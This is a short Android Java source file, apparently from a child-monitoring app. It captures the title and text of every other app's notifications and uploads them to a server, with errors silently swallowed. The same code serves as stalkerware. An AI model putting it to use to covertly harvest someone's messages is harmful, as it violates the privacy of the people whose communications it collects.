package com.childsafety.app;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import org.json.JSONObject;

public class NotificationListener extends NotificationListenerService {
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            Notification notif = sbn.getNotification();
            if (notif == null) return;
            Bundle extras = notif.extras;
            String title = extras.getString(Notification.EXTRA_TITLE, "");
            String text = extras.getString(Notification.EXTRA_TEXT, "");
            String pkg = sbn.getPackageName();
            if (pkg.equals(getPackageName())) return;

            JSONObject data = new JSONObject();
            data.put("package", pkg);
            data.put("title", title);
            data.put("body", text);
            data.put("timestamp", sbn.getPostTime());
            ApiClient.uploadData(this, "notification", data);
        } catch (Exception ignored) {}
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {}
}
